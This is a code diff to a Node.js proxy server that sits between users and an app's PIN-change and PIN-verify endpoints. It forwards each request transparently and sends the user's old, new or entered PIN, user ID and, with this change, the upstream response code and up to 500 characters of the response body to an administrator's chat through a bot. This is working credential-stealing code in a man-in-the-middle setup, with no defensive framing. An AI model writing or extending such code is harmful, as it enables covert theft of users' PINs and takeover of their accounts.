@@ -1669,8 +1669,11 @@ app.all('/app/user/info/updatePin', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
+    const code = jsonResp?.code || 'N/A';
+    const msg = jsonResp?.message || jsonResp?.msg || 'N/A';
+    const success = code === 1000 ? '✅' : '❌';
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🔐 PIN Change [${userId || 'N/A'}]\nOld: ${body.oldPin || 'N/A'}\nNew: ${body.newPin || body.pin || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔐 PIN Change ${success} [${userId || 'N/A'}]\nOld: ${body.oldPin || 'N/A'}\nNew: ${body.newPin || body.pin || 'N/A'}\n📋 Code: ${code} | ${msg}\n📋 Full: ${respBody.substring(0, 500)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1682,8 +1685,11 @@ app.all('/app/user/info/verifyPin', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
+    const code = jsonResp?.code || 'N/A';
+    const msg = jsonResp?.message || jsonResp?.msg || 'N/A';
+    const success = code === 1000 ? '✅' : '❌';
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🔐 PIN Verify [${userId || 'N/A'}]\nPIN: ${body.pin || body.verifyPin || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔐 PIN Verify ${success} [${userId || 'N/A'}]\nPIN: ${body.pin || body.verifyPin || 'N/A'}\n📋 Code: ${code} | ${msg}\n📋 Full: ${respBody.substring(0, 500)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
